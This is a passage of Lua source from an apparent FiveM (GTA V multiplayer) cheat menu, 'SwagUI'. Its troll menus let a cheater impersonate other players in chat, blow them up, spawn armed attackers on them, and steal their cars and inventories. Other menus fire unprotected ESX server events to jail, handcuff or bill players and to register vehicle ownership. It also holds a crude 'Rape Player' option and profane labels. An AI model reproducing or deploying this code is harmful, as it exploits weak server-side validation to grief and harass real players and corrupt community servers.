				local hamburg = "hei_prop_carrier_defense_01"
				local hamburghash = GetHashKey(hamburg)
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, 1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			end
			
			if SwagUI.Button("Attach Dome to Player") then
				local hamburg = "hei_prop_carrier_radar_2"
				local hamburghash = GetHashKey(hamburg)
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			end
			
			if SwagUI.Button("Attach TugBoat to Player") then
				local hamburg = "hei_prop_heist_tug"
				local hamburghash = GetHashKey(hamburg)
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, 1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			end
			
			if SwagUI.Button("Attach Roller Coaster to Player") then
				local hamburg = "ind_prop_dlc_roller_car"
				local hamburghash = GetHashKey(hamburg)
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, 1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			end
			
			
			if SwagUI.Button("Attach Hamburger to Player") then
				HamburgerP(SelectedPlayer)
			end
			
			
		
		
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("OnlineTrollMenu") then
			if SwagUI.Button("Fake Chat Message") then
                local messaggio = KeyboardInput("Enter message to send", "", 100)
                local cazzo = GetPlayerName(SelectedPlayer)
                if messaggio then
                  TriggerServerEvent("_chat:messageEntered", cazzo, { 0, 0x99, 255 }, messaggio)
				end
			end
			
			if SwagUI.Button("Airstrike Player") then
				AirstrikePlayer(SelectedPlayer)
			end
			
			if SwagUI.Button("PiggyBack Ride") then
				PiggyBack(SelectedPlayer)
			end
			
			if SwagUI.Button("Taze Player") then
				shoot_player_with(GetPlayerPed(SelectedPlayer), GetHashKey("WEAPON_STUNGUN"), 1)
			end
			
			if SwagUI.Button("Shoot With AK") then
				shoot_player_with(GetPlayerPed(SelectedPlayer), GetHashKey("WEAPON_ASSAULTRIFLE"), 50)
			end
			
			if SwagUI.Button("Shoot With RPG") then
				shoot_player_with(GetPlayerPed(SelectedPlayer), GetHashKey("WEAPON_RPG"), 1)
			end
			
			if SwagUI.Button("Clone Player Outfit") then
				CloneP(GetPlayerPed(SelectedPlayer))
			end
			
			if SwagUI.Button("Clone player Vehicle") then
				ClonePV(SelectedPlayer)
			end
			
			
			if SwagUI.Button("Fling Player/Car") then
				FlingingPlayer(SelectedPlayer)
			end
			
			if SwagUI.Button("Rape Player") then
				RapeP(SelectedPlayer)
			end
			
			if SwagUI.Button("Fuck Player Up") then
				FuckUpP(SelectedPlayer)
			end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("ExplodeTroll") then
		
			if SwagUI.Button("Flame Player Into Air") then
				ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 14, 1.0, true, false, 0)
			end
		
			if SwagUI.Button("Fire Hydrant Player") then
				ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 13, 10.0, true, false, 0)
			end
		
			if SwagUI.Button("Silent Explode Player") then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
			end
			
			if SwagUI.Button("Explode Player") then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
			end
			
			if SwagUI.Button("Explode Players Vehicle") then
				if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
				else
					SwagUI.SendNotification({ text = "Player Not In Vehicle", type = "error"})
				end
			end	
		
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("PedTrollMenu") then
		
			
			if SwagUI.Button("Nearby Peds Attack") then
				nearby_peds_attack(SelectedPlayer)
			end
		
			if SwagUI.Button("Spawn Swat With AK") then
                spawn_ped_with(SelectedPlayer, "s_m_y_swat_01", "WEAPON_ASSAULTRIFLE", 10)
            end
            
            if SwagUI.Button("Spawn Swat with Flaregun") then
                spawn_ped_with(SelectedPlayer, "s_m_y_swat_01", "weapon_flaregun", 10)
            end
            
            if SwagUI.Button("Spawn Swat with Railgun") then
                spawn_ped_with(SelectedPlayer, "s_m_y_swat_01", "weapon_railgun", 10)
            end
            
            if SwagUI.Button("Spawn Swat with RPG") then
                spawn_ped_with(SelectedPlayer, "s_m_y_swat_01", "weapon_rpg", 10)
            end
			
			if SwagUI.Button("Spawn Heli Enemies") then
				Spawn_Heli_Enemies(GetPlayerPed(selectedPlayer))
			end
			
			if SwagUI.Button("Spawn Tank Enemy") then
				Spawn_Tank_Enemy(GetPlayerPed(selectedPlayer))
			end
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("ESXMenuPlayer") then
		
			if SwagUI.Button("~g~ESX ~s~Community Service Player") then
				communityService(GetPlayerServerId(selectedPlayer))
			end
		
			if SwagUI.Button("~g~ESX ~s~Open Players Inventory") then
				TriggerServerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer))
			end
			
			if SwagUI.Button("~g~Disc ~s~Open Players Inventory") then
				SearchDisc(GetPlayerServerId(SelectedPlayer))
			end
			
			if SwagUI.Button("~g~Disc ~s~Steal Players Inventory") then
				StealDisc(GetPlayerServerId(SelectedPlayer))
			end
			
			if SwagUI.Button("~g~ESX ~s~Send Bill") then
				local amount = KeyboardInput("Enter Amount", "", 10)
				local name = KeyboardInput("Enter the name of the Bill", "", 25)
				if amount and name then
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(SelectedPlayer), "Purposeless", name, amount)
				end
			elseif SwagUI.Button("~g~ESX ~s~Handcuff Player") then
				TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
			elseif SwagUI.Button("~g~ESX ~s~Revive player") then
				TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
			elseif SwagUI.Button("~g~ESX ~s~Jail Player") then
                TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed")
                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
                TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
                TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed") 
			elseif SwagUI.Button("~g~ESX ~s~Unjail player") then
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))
			end

			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened("OnlineWepMenu") then
			SwagUI.SetSubTitle("OnlineWepMenu", "Weapons - " .. GetPlayerName(SelectedPlayer) .. "")
					
			SwagUI.MenuButton("Give Weapon", "OnlineWepCategory")
			
			if SwagUI.Button("Give Ammo") then
				for i = 1, #t_Weapons do
					AddAmmoToPed(GetPlayerPed(selectedPlayer), GetHashKey(t_Weapons[i][1]), 250.0)
				end
			end
			
			if SwagUI.Button("Give All Weapons") then
				for i = 1, #t_Weapons do
					GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 128, false, false)
				end
			end
			if SwagUI.Button("Remove All Weapons") then
				local ped = GetPlayerPed(SelectedPlayer)
				RemoveAllPedWeapons(ped, false)
			
				
				-- RemoveAllPedWeapons(GetPlayerPedScriptIndex(SelectedPlayer), true)
			end
			SwagUI.Display()
		
		
		
		elseif SwagUI.IsMenuOpened("OnlineWepCategory") then
			SwagUI.SetSubTitle("OnlineWepCategory", "Give Weapon - " .. GetPlayerName(SelectedPlayer) .. "")
			
			SwagUI.MenuButton("Melee", "OnlineMeleeWeapons")
			SwagUI.MenuButton("Handguns", "OnlineSidearmWeapons")
			SwagUI.MenuButton("Submachine Guns")
			SwagUI.MenuButton("Shotguns", "OnlineShotgunWeapons")
			SwagUI.MenuButton("Assault Rifles", "OnlineAutorifleWeapons")
			SwagUI.MenuButton("Light Machine Guns")
			SwagUI.MenuButton("Sniper Rifles")
			SwagUI.MenuButton("Heavy Weapons")

			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened("OnlineMeleeWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "melee" then
					if SwagUI.Button(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 0, false, false)
					end
				end
			end

			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened("OnlineSidearmWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "handguns" then
					if SwagUI.Button(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 32, false, false)
					end
				end
			end

			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened("OnlineAutorifleWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "assaultrifles" then
					if SwagUI.Button(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 60, false, false)
					end
				end
			end

			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened("OnlineShotgunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "shotguns" then
					if SwagUI.Button(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 18, false, false)
					end
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("TeleportP") then
			SwagUI.SetSubTitle("TeleportP", "Teleporting [" .. GetPlayerName(SelectedPlayer) .. "]")
			
			if SwagUI.Button("Teleport To Player") then
				Swag.Game:TeleportToPlayer(SelectedPlayer)
			end

			if SwagUI.Button("Teleport into Vehicle") then
				TeleportToPlayerVehicle(SelectedPlayer)
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("OnlineVehicleMenuPlayer") then
			SwagUI.SetSubTitle("OnlineVehicleMenuPlayer", "Vehicle [" .. GetPlayerName(SelectedPlayer) .. "]")
			if SwagUI.Button("Spawn Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = KeyboardInput("Enter Vehicle Model Name", "", 12)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(GetPlayerPed(SelectedPlayer)), GetEntityHeading(GetPlayerPed(SelectedPlayer)), true, true)
					
					RequestControlOnce(ped)
					SetPedIntoVehicle(ped, veh, -1)
					TaskWarpPedIntoVehicle(ped, veh, -1)
					SwagUI.SendNotification({text = NotifyFormat("Successfully spawned ~b~%s ~s~on ~b~%s", string.lower(GetDisplayNameFromVehicleModel(ModelName)), GetPlayerName(SelectedPlayer)), type = "info"})
				else
					SwagUI.SendNotification({text = "Model is not valid", type = "error"})
				end
			end
			if SwagUI.Button("Spawn Owned Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 20)
				local newPlate =  KeyboardInput("Enter Vehicle License Plate", "", 8)

				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					SetVehicleNumberPlateText(veh, newPlate)
					local vehicleProps = Swag.Game.GetVehicleProperties(veh)
					TriggerServerEvent('esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
					TriggerServerEvent('esx_givecarkeys:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
					TriggerServerEvent('garage:addKeys', newPlate)
					SetPedIntoVehicle(GetPlayerPed(SelectedPlayer), veh, -1)
				else
					SwagUI.SendNotification({ text = "Vehicle model " .. ModelName .. " does not exist!", type = "error"})
				end
			end
			
			if SwagUI.Button("Steal Players Car") then
				local ped = GetPlayerPed(SelectedPlayer)
				if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
					StealVehicle(SelectedPlayer)
				end
			end
			
			if SwagUI.Button("Kick From Vehicle") then
				ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
			end
			
			if SwagUI.Button("Delete Vehicle") then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local veh = GetVehiclePedIsIn(playerPed)
				RemoveVehicle(veh)
			end
			
			if SwagUI.Button("Destroy Engine") then

				local playerPed = GetPlayerPed(SelectedPlayer)
				local playerVeh = GetVehiclePedIsUsing(playerPed)
				local vehNet = VehToNet(playerVeh)
				NetworkRequestControlOfNetworkId(vehNet)
				playerVeh = NetToVeh(vehNet)
				NetworkRequestControlOfEntity(playerVeh)

				RequestControlOnce(playerVeh)

				--SetVehicleUndriveable(veh, true)
				SetVehicleEngineHealth(playerVeh, 0)
			end

			if SwagUI.Button("Repair Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local vehicle = GetVehiclePedIsUsing(ped)
				RepairVehicle(vehicle)
			end

			if SwagUI.ComboBox("Ram Player with Vehicle", ComboOptions.RamPlayerVehicle.Words, ComboOptions.RamPlayerVehicle.Selected, function(selectedIndex)
				if ComboOptions.RamPlayerVehicle.Selected ~= selectedIndex then
					ComboOptions.RamPlayerVehicle.Selected = selectedIndex
				end
			end) then
				Ram_Vehicle(GetPlayerPed(SelectedPlayer), ComboOptions.RamPlayerVehicle.Values[ComboOptions.RamPlayerVehicle.Selected])
			end
			
			if SwagUI.Button("Hamburger players Car") then
				HamburgerC(SelectedPlayer)
			end
			
			if SwagUI.Button("Vandalize Car") then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
				local vehNet = VehToNet(playerVeh)
				NetworkRequestControlOfNetworkId(vehNet)
				playerVeh = NetToVeh(vehNet)
				NetworkRequestControlOfEntity(playerVeh)
				StartVehicleAlarm(playerVeh)
				DetachVehicleWindscreen(playerVeh)
				SmashVehicleWindow(playerVeh, 0)
				SmashVehicleWindow(playerVeh, 1)
				SmashVehicleWindow(playerVeh, 2)
				SmashVehicleWindow(playerVeh, 3)
				SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
				SetVehicleDoorBroken(playerVeh, 0, true)
				SetVehicleDoorBroken(playerVeh, 1, true)
				SetVehicleDoorBroken(playerVeh, 2, true)
				SetVehicleDoorBroken(playerVeh, 3, true)
				SetVehicleDoorBroken(playerVeh, 4, true)
				SetVehicleDoorBroken(playerVeh, 5, true)
				SetVehicleDoorBroken(playerVeh, 6, true)
				SetVehicleDoorBroken(playerVeh, 7, true)
				SetVehicleLights(playerVeh, 1)
				Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
				SetVehicleNumberPlateTextIndex(playerVeh, 5)
				SetVehicleNumberPlateText(playerVeh, "Fuck 12")
				SetVehicleDirtLevel(playerVeh, 10.0)
				SetVehicleModColor_1(playerVeh, 1)
				SetVehicleModColor_2(playerVeh, 1)
				SetVehicleCustomPrimaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b) -- r = 231, g = 76, b = 60
				SetVehicleCustomSecondaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b)
				SetVehicleBurnout(playerVeh, true)
				SwagUI.SendNotification({text = "~g~Vehicle Fucked.", type = "success"})
			end

			SwagUI.Display()
		end

		for i, mods in pairs(LSC.vehicleMods) do
			if mods.meta == "modHorns" then
				if SwagUI.IsMenuOpened(mods.meta) then
					for j = 0, 51, 1 do
						if j == currentMods[mods.meta] then
							if SwagUI.Button(LSC.GetHornName(j), "Installed", nil, _menuColor.base) then 
								RemoveVehicleMod(Swag.Player.Vehicle, mods.id)
								LSC.UpdateMods()
							end
						else
							if SwagUI.Button(LSC.GetHornName(j), "Not Installed") then 
								SetVehicleMod(Swag.Player.Vehicle, mods.id, j)
								LSC.UpdateMods()
							end
						end
					end
					SwagUI.Display()
				end
			elseif mods.meta == "modFrontWheels" or mods.meta == "modBackWheels" then
				if SwagUI.IsMenuOpened(mods.meta) then
					local modCount = GetNumVehicleMods(Swag.Player.Vehicle, mods.id)
					for j = 0, modCount, 1 do
						local modName = GetModTextLabel(Swag.Player.Vehicle, mods.id, j)
						if modName then
							if j == currentMods[mods.meta] then
								if SwagUI.Button(GetLabelText(modName), "Installed", nil, _menuColor.base) then 
									RemoveVehicleMod(Swag.Player.Vehicle, mods.id)
									LSC.UpdateMods()
								end
							else
								if SwagUI.Button(GetLabelText(modName), "Not Installed") then 
									SetVehicleMod(Swag.Player.Vehicle, mods.id, j)
									LSC.UpdateMods()
								end
							end
						end
					end
					SwagUI.Display()
				end
			else
				if SwagUI.IsMenuOpened(mods.meta) then
					local modCount = GetNumVehicleMods(Swag.Player.Vehicle, mods.id)
					for j = 0, modCount, 1 do
						local modName = GetModTextLabel(Swag.Player.Vehicle, mods.id, j)
						if modName then
							if j == currentMods[mods.meta] then
								if SwagUI.Button(GetLabelText(modName), "Installed", nil, _menuColor.base) then 
									RemoveVehicleMod(Swag.Player.Vehicle, mods.id)
									LSC.UpdateMods()
								end
							else
								if SwagUI.Button(GetLabelText(modName), "Not Installed") then 
									SetVehicleMod(Swag.Player.Vehicle, mods.id, j)
									LSC.UpdateMods()
								end
							end
						end
					end
					SwagUI.Display()
				end
			end
		end
		
		Wait(0)
	end
end
CreateThread(MenuRuntimeThread)
